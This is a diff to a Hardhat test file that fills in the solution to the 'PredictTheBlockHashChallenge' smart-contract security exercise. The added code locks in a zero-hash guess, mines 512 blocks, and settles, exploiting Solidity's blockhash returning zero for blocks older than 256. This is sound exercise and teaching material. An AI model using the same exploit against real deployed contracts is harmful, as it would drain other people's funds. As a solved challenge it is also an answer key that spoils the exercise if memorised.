@@ -1,7 +1,7 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
-import { ethers } from 'hardhat';
+import { ethers, network } from 'hardhat';
 const { utils } = ethers;
 
 describe('PredictTheBlockHashChallenge', () => {
@@ -24,9 +24,29 @@ describe('PredictTheBlockHashChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+
+    /* The key to this challenge is that the blockhash function returns zero when blocknumber is not one of the most recent 256 blocks. See documentation: https://docs.soliditylang.org/_/downloads/en/latest/pdf/
+    */
+
+
+
+    const beforeBlockNumber = await ethers.provider.getBlockNumber();
+
+    console.log('current block number: ', beforeBlockNumber);
+
+    await target.lockInGuess('0x0000000000000000000000000000000000000000000000000000000000000000', { value: utils.parseEther('1') });
+
+    // console.log('locked in guess: ', await target.guess());
+
+    // mine 256 blocks twice
+    await network.provider.send("hardhat_mine", ["0x100"]);
+    await network.provider.send("hardhat_mine", ["0x100"]);
+
+    await target.settle();
+
+    const afterBlockNumber = await ethers.provider.getBlockNumber();
+
+    console.log('new block number: ', afterBlockNumber);
 
     expect(await target.isComplete()).to.equal(true);
   });
